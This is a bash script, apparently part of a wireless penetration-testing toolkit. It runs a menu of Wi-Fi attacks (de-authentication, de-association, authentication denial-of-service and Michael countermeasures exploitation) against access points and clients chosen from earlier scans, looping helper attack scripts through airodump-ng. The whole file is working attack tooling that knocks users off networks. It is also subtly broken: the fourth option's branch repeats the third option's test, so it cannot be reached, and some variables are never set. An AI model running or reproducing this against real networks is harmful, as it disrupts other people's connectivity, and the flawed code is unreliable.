OPTIONS='\n
Attack OPTIONS:\n
1 => De-Authentication Attack \n
2 => De-Association Attack \n
3 => Authentication DOS Attack \n
4 =>  Michael Countermeasures Exploitation (Only For TKIP Enabled APs) \n
'

echo -e $OPTIONS

project_name=$2
interface_name=$1

keyword="00"
user_input=""

read -p "Enter an Attack Option (type '00' to Main Menu): " user_input

while [ "$user_input" != "$keyword" ]
do

#Performing DeAuth Attack
    	if [ $user_input -eq 1 ]; then
    		secs=5
    		bssid=''
    		channel=''
    		packets=5
    		attack_itteration_times=5
    		user_input_packets=''
    		attack_itteration=''
    		delay_itteration=''
			echo -e "\n\033[31m[*] ScannedAPs:\033[0m"
    		cat projects/$project_name/ScannedAPs.csv
    		echo ""
    		read -p "Enter BSSID: " bssid
    		read -p "Enter Channel Number: " channel
	    	read -p "Enter Number of DeAuth Packets Sent During the Attack (Number)(Default: 5Packts): " user_input_packets
    		read -p "Enter times to itterate DeAuth Attack (Numbers)(Default: 5times): " attack_itteration
   	 		read -p "Enter delay time between each itteration (Second)(Default: 5sec): " delay_itteration
   		 	if [ -n "$user_input_packets" ]; then
    		 	packets=$user_input_packets
			fi
    		if [ -n "$attack_itteration" ]; then
    	 		attack_itteration_times=$attack_itteration
			fi
    		if [ -n "$delay_itteration" ]; then
    	 		secs=$delay_itteration
			fi
    		cmd_time=`date +%d-%m-%y-%H_%M`
    		echo "----------------------------------------------------------------------" >> projects/$project_name/command.logs 	
    		echo $cmd_time >> projects/$project_name/command.logs
    		mac_addresses=$(awk '/^\[\*\] MAC Addresses of Stations Connected to AP:/ {p=1; next} p && NF {print $0}' projects/$project_name/scan-$bssid.txt)
    		counter=1
    		iw $interface_name set channel $channel 
    		xterm -e airodump-ng $interface_name --bssid $bssid --channel $channel & fg 2> /dev/null
    		pid=$(ps aux | grep xterm | grep -v 'grep' | awk '{print $2}')
    		while [ $counter -le $attack_itteration_times ]
			do
				echo -e "\n\033[33mItteration Number: $counter\033[0m" | tee -a projects/$project_name/command.logs 
    			while IFS= read -r client; do
        			echo -e "\033[33mDeauthenticating client: $client\033[0m" | tee -a projects/$project_name/command.logs
        			./scripts/deAuth.sh $interface_name $bssid $client $packets $channel| tee -a projects/$project_name/command.logs
        			sleep $secs  
    			done <<< $mac_addresses			
    			((counter++))
			done
			kill $pid



#Performing DeAss Attack
    	elif [ $user_input -eq 2 ]; then
    		mins=5
    		essid=''
    		bssid=''
    		channel=''
    		attack_itteration_times=5
    		user_input_mins=''
    		attack_itteration=''
    		delay_itteration=''
			echo -e "\n\033[31m[*] ScannedAPs:\033[0m"
    		cat projects/$project_name/ScannedAPs.csv
    		echo ""
    		read -p "Enter BSSID: " bssid
    		read -p "Enter ESSID: " essid
    		read -p "Enter Channel Number: " channel
	    	read -p "Enter Time to perform De-Assos Attack (Miniutes)(Default: 5mins): " user_input_mins
    		read -p "Enter times to itterate De-Assos Attack (Numbers)(Default: 5times): " attack_itteration
   	 		read -p "Enter delay time between each itteration (Second)(Default: 5sec): " delay_itteration
   		 	if [ -n "$user_input_mins" ]; then
    		 	mins=$user_input_mins
			fi
    		if [ -n "$attack_itteration" ]; then
    	 		attack_itteration_times=$attack_itteration
			fi
    		if [ -n "$delay_itteration" ]; then
    	 		secs=$delay_itteration
			fi
    		cmd_time=`date +%d-%m-%y-%H_%M`
    		echo "----------------------------------------------------------------------" >> projects/$project_name/command.logs 	
    		echo $cmd_time >> projects/$project_name/command.logs
    		mac_addresses=$(awk '/^\[\*\] MAC Addresses of Stations Connected to AP:/ {p=1; next} p && NF {print $0}' projects/$project_name/scan-$bssid.txt)
    		counter=1
    		iw $interface_name set channel $channel 
    		xterm -e airodump-ng $interface_name --bssid $bssid --channel $channel & fg 2> /dev/null
    		pid=$(ps aux | grep xterm | grep -v 'grep' | awk '{print $2}')
    		while [ $counter -le $attack_itteration_times ]
			do
				echo -e "\n\033[33mItteration Number: $counter\033[0m" | tee -a projects/$project_name/command.logs 
    			while IFS= read -r client; do
        			echo -e "\033[33mDeassociating client: $client\033[0m" | tee -a projects/$project_name/command.logs
        			./scripts/deAss.sh $interface_name $bssid $essid $client $mins $channel| tee -a projects/$project_name/command.logs
        			sleep $secs  
    			done <<< $mac_addresses			
    			((counter++))
			done
			kill $pid



#Performing Authentication DOS Attack
    	elif [ $user_input -eq 3 ]; then
    		mins=5
    		bssid=''
    		attack_itteration_times=5
    		user_input_mins=''
    		attack_itteration=''
    		delay_itteration=''
			echo -e "\n\033[31m[*] ScannedAPs:\033[0m"
    		cat projects/$project_name/ScannedAPs.csv
    		echo ""
    		read -p "Enter BSSID: " bssid
	    	read -p "Enter Time to perform Authentication DOS Attack (Miniutes)(Default: 5mins): " user_input_mins
    		read -p "Enter times to itterate Authentication DOS Attack (Numbers)(Default: 5times): " attack_itteration
   	 		read -p "Enter delay time between each itteration (Second)(Default: 5sec): " delay_itteration
   		 	if [ -n "$user_input_mins" ]; then
    		 	mins=$user_input_mins
			fi
    		if [ -n "$attack_itteration" ]; then
    	 		attack_itteration_times=$attack_itteration
			fi
    		if [ -n "$delay_itteration" ]; then
    	 		secs=$delay_itteration
			fi
    		cmd_time=`date +%d-%m-%y-%H_%M`
    		echo "----------------------------------------------------------------------" >> projects/$project_name/command.logs 	
    		echo $cmd_time >> projects/$project_name/command.logs
    		counter=1
    		iw $interface_name set channel $channel 
    		xterm -e airodump-ng $interface_name --bssid $bssid --channel $channel & fg 2> /dev/null
    		pid=$(ps aux | grep xterm | grep -v 'grep' | awk '{print $2}')
    		while [ $counter -le $attack_itteration_times ]
			do
				echo -e "\n\033[33mItteration Number: $counter\033[0m" | tee -a projects/$project_name/command.logs 
        		./scripts/authenticationDOS.sh $interface_name $bssid $mins| tee -a projects/$project_name/command.logs
        		sleep $secs  
    			((counter++))
			done
			kill $pid

#Performing Michael Countermeasures Exploitation
    	elif [ $user_input -eq 3 ]; then
    		mins=5
    		bssid=''
    		attack_itteration_times=5
    		user_input_mins=''
    		attack_itteration=''
    		delay_itteration=''
			echo -e "\n\033[31m[*] ScannedAPs:\033[0m"
    		cat projects/$project_name/ScannedAPs.csv
    		echo ""
    		read -p "Enter BSSID: " bssid
	    	read -p "Enter Time to perform Michael Countermeasures Exploitation Attack (Miniutes)(Default: 5mins): " user_input_mins
    		read -p "Enter times to itterate Michael Countermeasures Exploitation Attack (Numbers)(Default: 5times): " attack_itteration
   	 		read -p "Enter delay time between each itteration (Second)(Default: 5sec): " delay_itteration
   		 	if [ -n "$user_input_mins" ]; then
    		 	mins=$user_input_mins
			fi
    		if [ -n "$attack_itteration" ]; then
    	 		attack_itteration_times=$attack_itteration
			fi
    		if [ -n "$delay_itteration" ]; then
    	 		secs=$delay_itteration
			fi
    		cmd_time=`date +%d-%m-%y-%H_%M`
    		echo "----------------------------------------------------------------------" >> projects/$project_name/command.logs 	
    		echo $cmd_time >> projects/$project_name/command.logs
    		counter=1
    		iw $interface_name set channel $channel 
    		xterm -e airodump-ng $interface_name --bssid $bssid --channel $channel & fg 2> /dev/null
    		pid=$(ps aux | grep xterm | grep -v 'grep' | awk '{print $2}')
    		while [ $counter -le $attack_itteration_times ]
			do
				echo -e "\n\033[33mItteration Number: $counter\033[0m" | tee -a projects/$project_name/command.logs 
        		/mcExploitation.sh $interface_name $bssid $mins| tee -a projects/$project_name/command.logs
        		sleep $secs  
    			((counter++))
			done
			kill $pid

		else
    		echo -e "\n\033[31mInvalid Options!!!\033[0m"    
    	fi
    	echo -e $OPTIONS
		read -p "Enter an Attack Option (type '00' to Main Menu): " user_input
done
